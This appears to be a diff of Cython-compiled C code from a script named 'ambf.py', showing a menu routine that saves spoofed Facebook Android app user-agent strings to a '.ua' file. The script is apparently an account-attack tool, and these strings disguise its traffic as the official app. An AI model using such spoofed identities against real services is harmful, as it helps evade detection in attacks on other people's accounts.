+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 560, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":567
+    /* "ambf.py":561
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 567, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 561, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 567, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_read); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 561, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -17758,34 +17517,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 567, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 561, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-    __pyx_t_3 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 567, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 561, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 567, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_3) < 0) __PYX_ERR(0, 561, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":568
+    /* "ambf.py":562
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["3", "03"]:
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 568, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 562, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":569
+    /* "ambf.py":563
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["3", "03"]:
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 569, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 563, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __pyx_t_1 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
@@ -17799,12 +17558,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 569, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 563, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":563
+    /* "ambf.py":557
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["2", "02"]:             # <<<<<<<<<<<<<<
@@ -17814,7 +17573,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":570
+  /* "ambf.py":564
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["3", "03"]:             # <<<<<<<<<<<<<<
@@ -17823,20 +17582,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_3 = __pyx_v_ua;
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 570, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 564, __pyx_L1_error)
   if (!__pyx_t_5) {
   } else {
     __pyx_t_2 = __pyx_t_5;
     goto __pyx_L8_bool_binop_done;
   }
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 570, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_3, __pyx_kp_s_03, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 564, __pyx_L1_error)
   __pyx_t_2 = __pyx_t_5;
   __pyx_L8_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_t_5 = (__pyx_t_2 != 0);
   if (__pyx_t_5) {
 
-    /* "ambf.py":571
+    /* "ambf.py":565
  * 		menu()
  * 	elif ua in ["3", "03"]:
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")             # <<<<<<<<<<<<<<
@@ -17846,16 +17605,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F);
     __pyx_v_c_ua = __pyx_kp_s_FBAN_FB4A_FBAV_276_0_0_44_127_F;
 
-    /* "ambf.py":572
+    /* "ambf.py":566
  * 	elif ua in ["3", "03"]:
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 572, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 566, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 572, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 566, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -17870,21 +17629,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_4, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 572, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 566, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":573
+    /* "ambf.py":567
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 573, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 567, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 567, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -17899,21 +17658,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_1, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 573, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 567, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
 
-    /* "ambf.py":574
+    /* "ambf.py":568
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 574, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 568, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_read); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 574, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_read); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 568, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -17928,34 +17687,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 574, __pyx_L1_error)
+    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 568, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-    __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 574, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 568, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 574, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_1) < 0) __PYX_ERR(0, 568, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":575
+    /* "ambf.py":569
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["4", "04"]:
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 575, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 569, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":576
+    /* "ambf.py":570
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["4", "04"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 576, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 570, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -17969,12 +17728,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 576, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 570, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":570
+    /* "ambf.py":564
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["3", "03"]:             # <<<<<<<<<<<<<<
@@ -17984,7 +17743,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":577
+  /* "ambf.py":571
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["4", "04"]:             # <<<<<<<<<<<<<<
@@ -17993,20 +17752,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_4, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 577, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_4, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 571, __pyx_L1_error)
   if (!__pyx_t_2) {
   } else {
     __pyx_t_5 = __pyx_t_2;
     goto __pyx_L10_bool_binop_done;
   }
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_04, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 577, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_04, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 571, __pyx_L1_error)
   __pyx_t_5 = __pyx_t_2;
   __pyx_L10_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_t_2 = (__pyx_t_5 != 0);
   if (__pyx_t_2) {
 
-    /* "ambf.py":578
+    /* "ambf.py":572
  * 		menu()
  * 	elif ua in ["4", "04"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")             # <<<<<<<<<<<<<<
@@ -18016,16 +17775,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
     __pyx_v_c_ua = __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4;
 
-    /* "ambf.py":579
+    /* "ambf.py":573
  * 	elif ua in ["4", "04"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 579, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 573, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 579, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -18040,21 +17799,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 579, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 573, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":580
+    /* "ambf.py":574
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 580, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 574, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 580, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 574, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -18069,21 +17828,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 580, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 574, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":581
+    /* "ambf.py":575
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 581, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 575, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 581, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 575, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -18098,34 +17857,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 581, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 575, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 581, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 575, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 581, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 575, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":582
+    /* "ambf.py":576
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["5", "05"]:
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 582, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 576, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":583
